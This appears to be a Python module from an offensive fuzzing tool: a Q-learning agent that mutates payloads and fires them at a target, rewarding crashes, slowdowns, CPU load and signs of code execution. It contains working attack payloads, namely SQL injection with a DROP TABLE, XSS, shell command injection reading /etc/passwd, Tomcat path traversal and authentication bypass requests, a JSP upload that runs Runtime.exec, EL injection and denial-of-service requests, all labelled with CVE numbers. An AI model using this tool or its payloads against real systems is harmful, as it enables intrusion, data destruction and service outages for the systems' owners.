"""
RL Agent - Reinforcement Learning-based payload optimization.

Uses Q-learning with an expanded action space for vulnerability-aware mutations.
Accepts feedback from the Fuzzer to bias action selection.
"""
import random
import logging
import numpy as np
from typing import Optional, List, Dict, Any

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class RLAgent:
    """Reinforcement Learning Agent for payload optimization."""
    
    # Expanded action space: 17 vulnerability-aware mutations
    DEFAULT_ACTIONS = [
        # Original actions
        "increase_length",      # Add padding (buffer overflow)
        "change_char",          # Mutate last byte
        "add_nop_sled",         # NOP sled for shellcode
        # Web-focused actions
        "inject_format_string", # %n%n%s injection
        "inject_sqli",          # SQL injection payload
        "inject_xss",           # XSS payload
        "inject_cmd",           # Command injection (;id;date)
        "inject_path_traversal",# Path traversal (../../)
        # Binary-focused actions
        "increase_offset",      # Large padding increase
        "inject_rop_nop",       # ROP gadget patterns
        "mutate_address",       # Randomize address bytes
        # TOMCAT 11 CVE-SPECIFIC ACTIONS
        "inject_cve_24813",     # Path Traversal + Deser RCE
        "inject_cve_toctou",    # TOCTOU Race Condition RCE
        "inject_cve_55752",     # Directory Traversal via Rewrite
        "inject_auth_bypass",   # CVE-2025-49125 Auth Bypass
        "inject_dos",           # DoS payloads
        "inject_el",            # EL Injection for Tomcat
    ]
    
    # CVE-specific actions for forced cycling
    CVE_ACTIONS = [
        "inject_cve_24813", "inject_cve_toctou", "inject_cve_55752",
        "inject_auth_bypass", "inject_dos", "inject_el"
    ]
    
    def __init__(self, actions=None):
        self.actions = actions if actions else self.DEFAULT_ACTIONS
        self.q_table = {}  # State -> Action values
        self.learning_rate = 0.1
        self.discount_factor = 0.95
        self.epsilon = 0.35  # INCREASED: More exploration
        self.epsilon_min = 0.1
        self.epsilon_decay = 0.995  # Decay after each iteration
        
        # Track action history for repeat penalty
        self.action_history = []
        self.iteration_count = 0
        
        # DB for Resource-Aware Fuzzing
        try:
            from ml_engine.db_manager import DatabaseManager
            self.db = DatabaseManager()
            if not self.db.connected:
                self.db = None
        except:
            self.db = None

    def get_state(self, response_code, payload_length, has_error=False, high_latency=False):
        """
        Discretize state space with richer signals.
        
        Returns: tuple (status_bucket, length_bucket, error_flag, latency_flag)
        """
        # Bucket status codes: 1xx=1, 2xx=2, 3xx=3, 4xx=4, 5xx=5, other=0
        status_bucket = response_code // 100 if 100 <= response_code < 600 else 0
        length_bucket = min(payload_length // 50, 20)  # Cap at 20 buckets
        return (status_bucket, length_bucket, int(has_error), int(high_latency))

    def choose_action(self, state, feedback=None):
        """
        Choose action using epsilon-greedy with:
        - Feedback bias
        - CVE action cycling (every 5th iteration)
        - Repeat penalty (avoid 3+ same actions)
        """
        self.iteration_count += 1
        
        # ============================================================
        # 1. FORCED CVE CYCLING: Every 5th iteration, use a CVE action
        # ============================================================
        if self.iteration_count % 5 == 0:
            cve_action = random.choice(self.CVE_ACTIONS)
            logger.info(f"RL Agent: Forced CVE action cycle -> '{cve_action}'")
            self._record_action(cve_action)
            return cve_action
        
        # ============================================================
        # 2. REPEAT PENALTY: If last 3 actions are the same, force different
        # ============================================================
        if len(self.action_history) >= 3:
            if self.action_history[-1] == self.action_history[-2] == self.action_history[-3]:
                # Force a different action
                repeated_action = self.action_history[-1]
                available = [a for a in self.actions if a != repeated_action]
                new_action = random.choice(available)
                logger.info(f"RL Agent: Breaking repeat pattern -> '{new_action}' (was repeating '{repeated_action}')")
                self._record_action(new_action)
                return new_action
        
        # ============================================================
        # 3. FEEDBACK BIAS (existing logic)
        # ============================================================
        if feedback:
            biased_action = self._bias_action_from_feedback(feedback)
            if biased_action and random.random() < 0.4:
                logger.info(f"RL Agent: Biasing action to '{biased_action}' based on feedback")
                self._record_action(biased_action)
                return biased_action
        
        # ============================================================
        # 4. EPSILON-GREEDY with decay
        # ============================================================
        if random.uniform(0, 1) < self.epsilon:
            action = random.choice(self.actions)
            self._record_action(action)
            # Decay epsilon
            if self.epsilon > self.epsilon_min:
                self.epsilon *= self.epsilon_decay
            return action
        
        if state not in self.q_table:
            self.q_table[state] = np.zeros(len(self.actions))
        
        best_action = self.actions[np.argmax(self.q_table[state])]
        self._record_action(best_action)
        return best_action
    
    def _record_action(self, action):
        """Track action history for repeat penalty. Keep last 10."""
        self.action_history.append(action)
        if len(self.action_history) > 10:
            self.action_history.pop(0)

    def _bias_action_from_feedback(self, feedback) -> Optional[str]:
        """Prioritize actions based on fuzzer feedback."""
        # Import here to avoid circular dependency
        from ml_engine.feedback_context import FeedbackContext
        
        if not isinstance(feedback, FeedbackContext):
            return None
        
        # DoS indicators -> try larger payloads
        if feedback.has_dos_indicators():
            return random.choice(["increase_length", "increase_offset"])
        
        # RCE indicators -> refine command injection
        if feedback.has_rce_indicators():
            return "inject_cmd"
        
        # Crash indicators (binary) -> adjust memory layout
        if feedback.has_crash_indicators():
            return random.choice(["increase_offset", "mutate_address", "add_nop_sled"])
        
        # Web vulnerability type -> web-focused actions
        if feedback.vuln_type == "web":
            return random.choice(["inject_sqli", "inject_xss", "inject_cmd", "inject_path_traversal"])
        
        # Binary vulnerability type -> binary-focused actions
        if feedback.vuln_type == "binary":
            return random.choice(["increase_offset", "inject_rop_nop", "add_nop_sled"])
        
        return None

    def learn(self, state, action_idx, reward, next_state):
        """Update Q-table using Q-learning formula."""
        if state not in self.q_table:
            self.q_table[state] = np.zeros(len(self.actions))
        if next_state not in self.q_table:
            self.q_table[next_state] = np.zeros(len(self.actions))
            
        prediction = self.q_table[state][action_idx]
        target = reward + self.discount_factor * np.max(self.q_table[next_state])
        self.q_table[state][action_idx] = prediction + self.learning_rate * (target - prediction)

    def apply_action(self, action: str, payload: bytes) -> bytes:
        """Apply mutation action to payload."""
        if action == "increase_length":
            return payload + b"A" * 10
        
        elif action == "change_char":
            if len(payload) > 0:
                return payload[:-1] + bytes([random.randint(0, 255)])
            return payload
        
        elif action == "add_nop_sled":
            return b"\x90" * 16 + payload
        
        elif action == "inject_format_string":
            return payload + b"%n%n%n%s%x%x"
        
        elif action == "inject_sqli":
            sqli_payloads = [b"' OR '1'='1", b"'; DROP TABLE users;--", b"1' AND '1'='1"]
            return payload + random.choice(sqli_payloads)
        
        elif action == "inject_xss":
            xss_payloads = [b"<script>alert(1)</script>", b"<img src=x onerror=alert(1)>"]
            return payload + random.choice(xss_payloads)
        
        elif action == "inject_cmd":
            cmd_payloads = [b"; id; date;", b"| id", b"`id`", b"$(id)", b"; cat /etc/passwd"]
            return payload + random.choice(cmd_payloads)
        
        elif action == "inject_path_traversal":
            return b"../" * 5 + payload
        
        elif action == "increase_offset":
            return payload + b"A" * 50  # Larger increment for binary
        
        elif action == "inject_rop_nop":
            # Common ROP/debugging patterns
            return payload + b"\xcc" * 4 + b"\x90" * 8
        
        elif action == "mutate_address":
            # Randomize last 2 bytes (partial address overwrite)
            if len(payload) >= 2:
                return payload[:-2] + bytes([random.randint(0, 255), random.randint(0, 255)])
            return payload
        
        # ============================================================
        # TOMCAT 11 CVE-SPECIFIC ACTIONS
        # ============================================================
        
        elif action == "inject_cve_24813":
            # CVE-2025-24813: Path Traversal + Deserialization RCE
            cve_24813_payloads = [
                b"GET /..;/manager/html HTTP/1.1\r\nHost: target\r\n\r\n",
                b"GET /..;/..;/WEB-INF/web.xml HTTP/1.1\r\nHost: target\r\n\r\n",
                b"GET /%2e%2e;/manager/status HTTP/1.1\r\nHost: target\r\n\r\n",
                b"PUT /.session HTTP/1.1\r\nHost: target\r\n\r\n",
            ]
            return random.choice(cve_24813_payloads)
        
        elif action == "inject_cve_toctou":
            # CVE-2024-50379/56337: TOCTOU Race Condition RCE
            toctou_payloads = [
                b"PUT /test.Jsp HTTP/1.1\r\nHost: target\r\n\r\n<%Runtime.getRuntime().exec(\"id\");%>",
                b"PUT /test.jSp HTTP/1.1\r\nHost: target\r\n\r\n<%= Runtime.getRuntime().exec(\"whoami\") %>",
                b"GET /test.jsp HTTP/1.1\r\nHost: target\r\n\r\n",
            ]
            return random.choice(toctou_payloads)
        
        elif action == "inject_cve_55752":
            # CVE-2025-55752: Directory Traversal via Rewrite
            cve_55752_payloads = [
                b"GET /rewrite/..;/WEB-INF/web.xml HTTP/1.1\r\nHost: target\r\n\r\n",
                b"GET /..%252f..%252fWEB-INF/classes/ HTTP/1.1\r\nHost: target\r\n\r\n",
                b"GET /%c0%ae%c0%ae/WEB-INF/ HTTP/1.1\r\nHost: target\r\n\r\n",
            ]
            return random.choice(cve_55752_payloads)
        
        elif action == "inject_auth_bypass":
            # CVE-2025-49125: Authentication Bypass
            auth_bypass_payloads = [
                b"GET /manager/..;/html HTTP/1.1\r\nHost: target\r\n\r\n",
                b"GET /;/manager/html HTTP/1.1\r\nHost: target\r\n\r\n",
                b"GET /manager;foo=bar/html HTTP/1.1\r\nHost: target\r\n\r\n",
                b"GET //manager/html HTTP/1.1\r\nHost: target\r\n\r\n",
            ]
            return random.choice(auth_bypass_payloads)
        
        elif action == "inject_dos":
            # CVE-2024-54677, CVE-2025-53506: DoS Attacks
            dos_payloads = [
                b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 999999999\r\n\r\n",
                b"POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\nFFFFFF\r\n" + b"A" * 5000,
            ]
            return random.choice(dos_payloads)
        
        elif action == "inject_el":
            # EL Injection Payloads for Tomcat (CWE-917)
            el_payloads = [
                b"${7*7}",
                b"${T(java.lang.Runtime).getRuntime().exec('id')}",
                b"${''.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami')}",
                b"${applicationScope}",
            ]
            return payload + random.choice(el_payloads)
        
        # Fallback: return original payload if action unknown
        return payload

    def optimize_exploit(
        self, 
        initial_payload, 
        iterations=50, 
        target_ip=None, 
        target_port=None,
        fuzzer=None,
        feedback=None
    ):
        """
        Runs an RL loop to optimize the payload.
        
        Args:
            initial_payload: Starting payload bytes
            iterations: Number of optimization iterations
            target_ip: Target IP for real attacks
            target_port: Target port for real attacks
            fuzzer: Shared Fuzzer instance (reuses spider paths)
            feedback: FeedbackContext from prior fuzzing phase
        """
        logger.info("Starting RL optimization...")
        
        # Log feedback reception
        if feedback:
            from ml_engine.feedback_context import FeedbackContext
            if isinstance(feedback, FeedbackContext):
                logger.info(f"RL Agent: Received feedback with {len(feedback.crashes)} crashes, "
                           f"{len(feedback.spider_paths)} spider paths, vuln_type={feedback.vuln_type}")
        
        # Ensure payload is bytes
        if isinstance(initial_payload, str):
            current_payload = initial_payload.encode()
        else:
            current_payload = initial_payload
            
        # Use shared Fuzzer or create new one
        if fuzzer is None:
            from ml_engine.fuzzing_module import Fuzzer
            fuzzer = Fuzzer(target_ip, target_port)
            logger.info("RL Agent: Created new Fuzzer instance")
        else:
            logger.info(f"RL Agent: Using shared Fuzzer with {len(fuzzer.paths)} spider paths")
        
        best_payload = current_payload
        best_reward = -float('inf')
        
        for i in range(iterations):
            state = self.get_state(200, len(current_payload))
            action = self.choose_action(state, feedback)
            action_idx = self.actions.index(action)
            
            # Apply action using new modular method
            current_payload = self.apply_action(action, current_payload)
            
            # Get Reward (Real or Mock)
            reward = 0
            is_crash = False
            
            if target_ip:
                # Real Attack
                result = fuzzer.send_payload(current_payload)
                
                if result["crash"]:
                    reward = 100
                    is_crash = True
                    logger.info(f"RL Agent: CRASH achieved at iteration {i}!")
                else:
                    # Smart Reward: Penalize failure but reward Latency Spikes (DoS potential)
                    latency_bonus = max(0, (result["time_ms"] - 200) / 100.0) * 0.5
                    high_latency = result["time_ms"] > 1500
                    reward = -0.1 + min(5, latency_bonus)
                    
                    # RCE Detection: Check response for command output indicators
                    has_rce = False
                    if result.get("data"):
                        rce_success, rce_indicator = fuzzer.check_rce_success(result["data"])
                        if rce_success:
                            reward += 50  # Big bonus for RCE!
                            has_rce = True
                            logger.critical(f"RL Agent: RCE DETECTED! Indicator: {rce_indicator}")
                    
                    # Resource-Aware Bonus from agent logs
                    if self.db:
                        metrics = self.db.get_recent_metrics(limit=1, seconds=2)
                        if metrics:
                            cpu = metrics[0].get('metrics', {}).get('cpu_percent', 0)
                            if cpu > 50:
                                cpu_bonus = (cpu - 50) * 0.5
                                reward += cpu_bonus
                                logger.info(f"RL Agent: CPU Bonus (+{cpu_bonus:.1f}) for {cpu}% CPU usage.")
                    
                    if latency_bonus > 1:
                        logger.info(f"RL Agent: Latency Bonus (+{latency_bonus:.1f}) for {result['time_ms']:.1f}ms response.")
                        
                    is_crash = False
            else:
                # Mock Reward (simulation mode)
                if len(current_payload) > 200:
                    reward = 10
                    is_crash = True
                high_latency = False
                has_rce = False
            
            # Track best payload
            if reward > best_reward:
                best_reward = reward
                best_payload = current_payload
            
            # Use improved state with error/latency signals
            next_state = self.get_state(
                500 if is_crash else 200, 
                len(current_payload),
                has_error=is_crash,
                high_latency=high_latency if 'high_latency' in dir() else False
            )
            self.learn(state, action_idx, reward, next_state)
            
            if is_crash:
                logger.info(f"RL Agent: Optimization complete at iteration {i}, crash achieved!")
                break
        
        logger.info(f"RL Agent: Returning best payload ({len(best_payload)} bytes, reward={best_reward:.2f})")
        return best_payload


if __name__ == "__main__":
    agent = RLAgent()
    print(f"Available actions: {agent.actions}")
    print(f"Optimized Payload: {agent.optimize_exploit('start')}")
